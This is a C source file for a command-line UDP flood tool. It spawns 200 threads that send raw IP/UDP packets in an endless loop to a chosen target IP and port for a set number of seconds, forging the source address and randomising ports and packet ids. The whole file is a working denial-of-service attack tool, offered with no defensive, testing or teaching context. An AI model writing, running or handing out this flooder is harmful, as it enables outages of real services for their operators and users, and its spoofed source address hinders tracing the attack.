#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <sys/time.h>
#include <errno.h>

#define THREADS 200
#define PACKET_SIZE 1024
#define THROTTLE_US 500
#define SRC_PORT_START 1024
#define SRC_PORT_END 65535

struct thread_args {
    char *target_ip;
    int target_port;
    int thread_id;
};

void throttle(unsigned long us) {
    struct timeval tv;
    tv.tv_sec = us / 1000000;
    tv.tv_usec = us % 1000000;
    select(0, NULL, NULL, NULL, &tv);
}

void *flood_thread(void *arg) {
    struct thread_args *args = (struct thread_args *)arg;
    int sock;
    struct sockaddr_in dest;
    char packet[PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket");
        return NULL;
    }

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(PACKET_SIZE);
    ip->id = htons(getpid() + args->thread_id);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr("127.0.0.1");
    ip->daddr = inet_addr(args->target_ip);

    unsigned short src_port = SRC_PORT_START + (rand() % (SRC_PORT_END - SRC_PORT_START));
    udp->source = htons(src_port);
    udp->dest = htons(args->target_port);
    udp->len = htons(PACKET_SIZE - sizeof(struct iphdr));
    udp->check = 0;

    memset(data, 'A' + (rand() % 26), PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr));

    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(args->target_ip);
    dest.sin_port = htons(args->target_port);

    while (1) {
        udp->source = htons(src_port + (rand() % 100));
        ip->id = htons((rand() % 65535) + args->thread_id);

        if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("sendto");
        }
        throttle(THROTTLE_US);
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <duration_sec>\n", argv[0]);
        return 1;
    }

    int duration = atoi(argv[3]);
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    pthread_t threads[THREADS];
    struct thread_args args[THREADS];

    for (int i = 0; i < THREADS; i++) {
        args[i].target_ip = target_ip;
        args[i].target_port = target_port;
        args[i].thread_id = i;
        if (pthread_create(&threads[i], NULL, flood_thread, &args[i]) != 0) {
            perror("pthread_create");
        }
    }

    sleep(duration);

    for (int i = 0; i < THREADS; i++) {
        pthread_cancel(threads[i]);
    }
    return 0;
}
